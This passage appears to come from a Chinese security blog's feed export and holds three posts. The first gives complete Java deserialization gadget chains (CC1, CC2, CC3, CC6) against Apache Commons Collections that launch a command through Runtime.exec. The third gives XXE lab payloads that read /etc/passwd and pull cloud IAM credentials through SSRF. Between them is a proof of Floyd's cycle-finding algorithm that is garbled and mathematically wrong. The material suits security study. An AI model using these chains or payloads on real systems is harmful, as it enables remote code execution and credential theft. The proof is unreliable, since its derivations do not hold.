class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transforms);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">annotation</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=annotation.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler handler=(InvocationHandler) constructor.newInstance(Retention.class,outMap);</span><br><span class="line"></span><br><span class="line">        Map proxyMap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Map.class&#125;,handler);</span><br><span class="line">        handler= (InvocationHandler) constructor.newInstance(Retention.class,proxyMap);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(handler);</span></span><br><span class="line">        unserialize(<span class="string">&quot;CC1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oip.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CC2">CC2</h2>
<p>限制在CC3.x版本不可以使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object newValue)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;HelloTemplatesImpl.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">TemplatesImpl_instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        setFieldValue(TemplatesImpl_instance, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(TemplatesImpl_instance, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;TemplatesImpl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformer_comparator</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;comparator&quot;</span>,transformer_comparator);</span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TemplatesImpl_instance , TemplatesImpl_instance&#125;);</span><br><span class="line"></span><br><span class="line">        serialize(queue);</span><br><span class="line">        unserialize(<span class="string">&quot;CC2.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC2.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>贴一个payload即可，很多开始排列组合了，没必要继续下去了，主要就是寻找入口之后的一段调用，剩下的没啥问题了</p>
<h2 id="CC3">CC3</h2>
<p>配合字节码加载以及cc1的方法触发可以触发任意命令执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object newValue)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, newValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;HelloTemplatesImpl.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);						</span><br><span class="line">        setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">transformedmap</span> <span class="operator">=</span> TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cl</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotation</span> <span class="operator">=</span> cl.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotation.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotation.newInstance(Target.class,transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC3.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="CC6">CC6</h2>
<p>解决高版本的问题</p>
<p>首先org.apache.commons.collections.keyvalue.TiedMapEntry中的getValue方法调用了get，hashCode方法调用了getValue方法，只要使用hashcode就可以构造出新的链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transforms = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tme</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;keykey&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        expMap.put(tme, <span class="string">&quot;valuevalue&quot;</span>);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(transformerChain, transforms);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;CC6.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC6.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">oip</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> oip.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先先构造出LazyMap，transformerChain先使用fake，后面再替换防止运行时触发POC（参考之前的URL链子的原因）</p>
<p>然后使用TiedMapEntry将LazyMap带入，然后再创造一个新的Map用于触发hashcode然后触发TiedMapEntry中的getValue方法，然后调用get方法，但是put方法如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>调用了hash，那么也就是说还是触发了hashCode</p>
<p>此时将outerMap中的key进行remove即可，因为将其中的key的一些相关数值删除了，但是没有将键值对删去</p>
<p>链子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HashMap-&gt;hashCode-&gt;getValue</span><br><span class="line">	TiedMapEntry-&gt;getValue-&gt;get</span><br><span class="line">		LazyMap-&gt;get-&gt;transform</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>algorithm算法原理证明</title>
    <url>/2023/02/26/15-54-28/</url>
    <content><![CDATA[<h2 id="Floyd’s-cycle-finding-algorithm">Floyd’s cycle-finding algorithm</h2>
<span id="more"></span>
<p>Floyd’s cycle-finding algorithm是一种用于寻找链表中循环或重复元素的算法，也称为Floyd’s tortoise and hare algorithm。该算法使用两个指针，一个称为“乌龟”（tortoise）指针，另一个称为“兔子”（hare）指针。</p>
<p>算法的基本思路是，用两个指针同时从链表的头部出发，乌龟指针每次前进一步，兔子指针每次前进两步。如果链表中不存在循环，那么兔子指针最终会走到链表的末尾，此时算法结束。但是，如果链表中存在循环，那么兔子指针最终会进入循环中，此时兔子指针和乌龟指针必定会相遇。</p>
<p>当兔子指针进入循环后，它会一直绕圈，直到乌龟指针进入循环，兔子指针追上乌龟指针，也就是说，乌龟指针和兔子指针都在循环内部移动。此时，将兔子指针重新置为链表头部，再以每次前进一步的速度移动两个指针，最终它们会在循环的入口处相遇。这是因为兔子指针在每一轮循环中都比乌龟指针多走一圈，所以它们最终相遇的地方就是循环的入口。</p>
<p>该算法的时间复杂度为O(n)，空间复杂度为O(1)，其中n是链表中元素的个数。由于该算法只需要遍历链表一次，因此效率较高，被广泛应用于链表中循环或重复元素的查找。</p>
<h2 id="证明过程">证明过程</h2>
<p>在使用 Floyd’s cycle-finding algorithm 检测一个数是否是合数时，如果这个数有一个非平凡因子，那么它就是合数。这是因为当一个合数 n 有一个非平凡因子 d 时，可以将 n 表示为 n=d * q 的形式，其中 q 是另一个整数。那么 n 的一个非平凡因子就是 d 或 q。如果 d=q，则 d 就是 n 的平方根，因此在检查素性时只需要检查 n 的平方根以下的整数即可。但是如果<br />
$$<br />
d\neq q<br />
$$<br />
那么我们可以在 Floyd’s cycle-finding algorithm 中找到一个循环，其中循环长度为偶数，这样就找到了一个非平凡的因子。</p>
<p>具体来说，设 f(x) 表示对 n 取模的一个函数，定义为<br />
$$<br />
f(x)=(x^2+1)\bmod n<br />
$$<br />
从一个初始值开始，可以构造一个序列<br />
$$<br />
x_0,x_1,x_2,\ldots<br />
$$<br />
其中<br />
$$<br />
x_{i+1}=f(x_i)<br />
$$<br />
x取值范围是<br />
$$<br />
0\le x_i&lt;n<br />
$$<br />
因此这个序列必然存在一个循环，即存在<br />
$$<br />
i&lt;j而且x_i=x_j<br />
$$<br />
假设循环长度为偶数，即存在一个正整数 k，使得<br />
$$<br />
x_i=x_{i+k} 且 x_{i+1}=x_{i+k+1}<br />
$$<br />
那么可以证明<br />
$$<br />
d=\gcd(x_{i}-x_{i+k},n)是n的非平凡因子<br />
$$<br />
证明如下：根据假设，有<br />
$$<br />
x_i=x_{i+k} 和 x_{i+1}=x_{i+k+1} 存在 (x_{i+1}-x_i)=(x_{i+k+1}-x_{i+k})\pmod n<br />
$$<br />
那么，即<br />
$$<br />
(x_{i+1}-x_i)\equiv (x_{i+k+1}-x_{i+k})\pmod n<br />
$$<br />
由于<br />
$$<br />
f(x)=(x^2+1)\bmod n<br />
$$<br />
因此有<br />
$$<br />
x_{i+1}\equiv x_i^2+1\pmod n<br />
$$</p>
<p>$$<br />
x_{i+k+1}\equiv x_{i+k}^2+1\pmod n<br />
$$</p>
<p>代入上式得到<br />
$$<br />
x_i^2-x_{i+k}^2\equiv x_{i+1}-x_{i+k+1}\pmod n<br />
$$<br />
即<br />
$$<br />
(x_i-x_{i+k})(x_{i+1}+x_{i+k+1}-1)\equiv 0\pmod n<br />
$$</p>
<p>$$<br />
x_i=x_{i+k}，那么 d=\gcd(x_{i}-x_{i+k},n)=\gcd(0,n)=n<br />
$$</p>
<p>因此，如果我们能够找到一个长度为偶数的环，则可以使用上述方法得到一个非平凡的因子<br />
$$<br />
p = \gcd(2^k - 1, n)<br />
$$<br />
假设快指针和慢指针在节点 j 处相遇，此时快指针已经绕了 k 圈了，那么有：<br />
$$<br />
k=\frac{2⋅环的长度}{慢指针进入环之前走过的距离−快指针进入环之前走过的距离}<br />
$$<br />
由于慢指针走过的距离是快指针的一半，即<br />
$$<br />
慢指针进入环之前走过的距离=\frac{环的长度}{2}<br />
$$<br />
因此上式可以进一步化简为：<br />
$$<br />
k=\frac{环的长度}{快指针进入环之前走过的距离−\frac{环的长度}{2}}<br />
$$<br />
因为快指针每次走两步，所以 快指针进入环之前走过的距离 是 环的长度的整数倍，即<br />
$$<br />
快指针进入环之前走过的距离=x*环的长度<br />
$$<br />
代入上式中得：<br />
$$<br />
k=\frac{2}{x-1}<br />
$$<br />
因为 k 是整数，所以 x-1 必须是 2 的因子。根据前面的推导，环的长度是偶数，因此 x-1 必须是一个非平凡的因子，即 x-1 不等于 1和 n。因此我们可以通过找到一个非平凡的因子来判断 n 是否是合数。</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title>burp-xxe</title>
    <url>/2023/08/15/22-27-36/</url>
    <content><![CDATA[<h1>burp_xxe</h1>
<span id="more"></span>
<h3 id="level-1-Exploiting-XXE-using-external-entities-to-retrieve-files">level 1 Exploiting XXE using external entities to retrieve files</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="level-2-Exploiting-XXE-to-perform-SSRF-attacks">level 2 Exploiting XXE to perform SSRF attacks</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [ <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&quot;</span>&gt;</span> ]&gt;</span><span class="tag">&lt;<span class="name">stockCheck</span>&gt;</span><span class="tag">&lt;<span class="name">productId</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">productId</span>&gt;</span><span class="tag">&lt;<span class="name">storeId</span>&gt;</span>1<span class="tag">&lt;/<span class="name">storeId</span>&gt;</span><span class="tag">&lt;/<span class="name">stockCheck</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="level-3-Blind-XXE-with-out-of-band-interaction">level 3 Blind XXE with out-of-band interaction</h3>
